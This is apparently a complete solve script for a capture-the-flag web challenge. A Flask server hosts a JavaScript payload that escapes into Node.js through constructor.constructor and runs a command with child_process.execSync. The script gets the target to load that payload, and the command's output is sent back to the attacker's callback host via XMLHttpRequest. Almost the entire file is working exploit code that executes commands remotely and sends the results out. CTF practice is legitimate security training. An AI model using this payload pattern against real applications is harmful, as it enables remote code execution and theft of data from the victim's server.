#! /usr/bin/python3
import requests
import socket
from flask import Flask, request                                                    
import threading
import logging
import sys
import time

# Solve configuration
challenge = 'http://manhattan.pwn2.win/'
server_port = 8086
callback = 'http://checker.pwn2.win:' + str(server_port) + '/'
# Payloads
rce = """
<script>
try {
    let out = constructor.constructor('return process')().mainModule.require('child_process').execSync('/get_flag').toString();
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", "%sleak?flag=" + encodeURIComponent(out), true);
    xhttp.send();
} catch(err) {

}
</script>
"""

# Flask setup 
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
app.logger.disabled = True

# routes
@app.route("/")
def main():
    return rce % (callback)

@app.route("/leak")
def leak():
    flag = request.args.get('flag')
    print(flag)
    request.environ.get('werkzeug.server.shutdown')()
    return 'yay'

# main code
if __name__ == "__main__":

    # open sockets
    threading.Thread(target=app.run, kwargs=dict(host='0.0.0.0', port=server_port, debug=False)).start()

    # send payloads
    r = requests.post(challenge, data={"url": callback})
    #print(r.content)


        